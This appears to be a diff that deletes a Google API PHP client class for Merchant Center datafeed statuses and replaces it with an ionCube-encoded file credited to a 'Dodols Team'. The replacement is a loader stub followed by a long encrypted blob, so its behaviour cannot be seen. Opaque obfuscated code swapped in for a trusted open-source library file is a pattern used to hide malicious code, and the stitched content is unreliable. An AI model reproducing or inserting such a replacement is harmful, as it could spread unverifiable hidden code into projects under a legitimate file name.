@@ -1,96 +1,59 @@
-<?php
-/*
- * Copyright 2014 Google Inc.
- *
- * Licensed under the Apache License, Version 2.0 (the "License"); you may not
- * use this file except in compliance with the License. You may obtain a copy of
- * the License at
- *
- * http://www.apache.org/licenses/LICENSE-2.0
- *
- * Unless required by applicable law or agreed to in writing, software
- * distributed under the License is distributed on an "AS IS" BASIS, WITHOUT
- * WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the
- * License for the specific language governing permissions and limitations under
- * the License.
- */
-
-namespace Google\Service\ShoppingContent\Resource;
-
-use Google\Service\ShoppingContent\DatafeedStatus;
-use Google\Service\ShoppingContent\DatafeedstatusesCustomBatchRequest;
-use Google\Service\ShoppingContent\DatafeedstatusesCustomBatchResponse;
-use Google\Service\ShoppingContent\DatafeedstatusesListResponse;
-
-/**
- * The "datafeedstatuses" collection of methods.
- * Typical usage is:
- *  <code>
- *   $contentService = new Google\Service\ShoppingContent(...);
- *   $datafeedstatuses = $contentService->datafeedstatuses;
- *  </code>
- */
-class Datafeedstatuses extends \Google\Service\Resource
-{
-  /**
-   * Gets multiple Merchant Center datafeed statuses in a single request.
-   * (datafeedstatuses.custombatch)
-   *
-   * @param DatafeedstatusesCustomBatchRequest $postBody
-   * @param array $optParams Optional parameters.
-   * @return DatafeedstatusesCustomBatchResponse
-   */
-  public function custombatch(DatafeedstatusesCustomBatchRequest $postBody, $optParams = [])
-  {
-    $params = ['postBody' => $postBody];
-    $params = array_merge($params, $optParams);
-    return $this->call('custombatch', [$params], DatafeedstatusesCustomBatchResponse::class);
-  }
-  /**
-   * Retrieves the status of a datafeed from your Merchant Center account.
-   * (datafeedstatuses.get)
-   *
-   * @param string $merchantId The ID of the account that manages the datafeed.
-   * This account cannot be a multi-client account.
-   * @param string $datafeedId The ID of the datafeed.
-   * @param array $optParams Optional parameters.
-   *
-   * @opt_param string country The country for which to get the datafeed status.
-   * If this parameter is provided then language must also be provided. Note that
-   * this parameter is required for feeds targeting multiple countries and
-   * languages, since a feed may have a different status for each target.
-   * @opt_param string language The language for which to get the datafeed status.
-   * If this parameter is provided then country must also be provided. Note that
-   * this parameter is required for feeds targeting multiple countries and
-   * languages, since a feed may have a different status for each target.
-   * @return DatafeedStatus
-   */
-  public function get($merchantId, $datafeedId, $optParams = [])
-  {
-    $params = ['merchantId' => $merchantId, 'datafeedId' => $datafeedId];
-    $params = array_merge($params, $optParams);
-    return $this->call('get', [$params], DatafeedStatus::class);
-  }
-  /**
-   * Lists the statuses of the datafeeds in your Merchant Center account.
-   * (datafeedstatuses.listDatafeedstatuses)
-   *
-   * @param string $merchantId The ID of the account that manages the datafeeds.
-   * This account cannot be a multi-client account.
-   * @param array $optParams Optional parameters.
-   *
-   * @opt_param string maxResults The maximum number of products to return in the
-   * response, used for paging.
-   * @opt_param string pageToken The token returned by the previous request.
-   * @return DatafeedstatusesListResponse
-   */
-  public function listDatafeedstatuses($merchantId, $optParams = [])
-  {
-    $params = ['merchantId' => $merchantId];
-    $params = array_merge($params, $optParams);
-    return $this->call('list', [$params], DatafeedstatusesListResponse::class);
-  }
-}
-
-// Adding a class alias for backwards compatibility with the previous class name.
-class_alias(Datafeedstatuses::class, 'Google_Service_ShoppingContent_Resource_Datafeedstatuses');
+<?php //00551
+// --------------------------
+// Created by Dodols Team
+// --------------------------
+if(!extension_loaded('ionCube Loader')){$__oc=strtolower(substr(php_uname(),0,3));$__ln='ioncube_loader_'.$__oc.'_'.substr(phpversion(),0,3).(($__oc=='win')?'.dll':'.so');if(function_exists('dl')){@dl($__ln);}if(function_exists('_il_exec')){return _il_exec();}$__ln='/ioncube/'.$__ln;$__oid=$__id=realpath(ini_get('extension_dir'));$__here=dirname(__FILE__);if(strlen($__id)>1&&$__id[1]==':'){$__id=str_replace('\\','/',substr($__id,2));$__here=str_replace('\\','/',substr($__here,2));}$__rd=str_repeat('/..',substr_count($__id,'/')).$__here.'/';$__i=strlen($__rd);while($__i--){if($__rd[$__i]=='/'){$__lp=substr($__rd,0,$__i).$__ln;if(file_exists($__oid.$__lp)){$__ln=$__lp;break;}}}if(function_exists('dl')){@dl($__ln);}}else{die('The file '.__FILE__." is corrupted.\n");}if(function_exists('_il_exec')){return _il_exec();}echo("Site error: the ".(php_sapi_name()=='cli'?'ionCube':'<a href="http://www.ioncube.com">ionCube</a>')." PHP Loader needs to be installed. This is a widely used PHP extension for running ionCube protected PHP code, website security and malware blocking.\n\nPlease visit ".(php_sapi_name()=='cli'?'get-loader.ioncube.com':'<a href="http://get-loader.ioncube.com">get-loader.ioncube.com</a>')." for install assistance.\n\n");exit(199);
+?>
+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
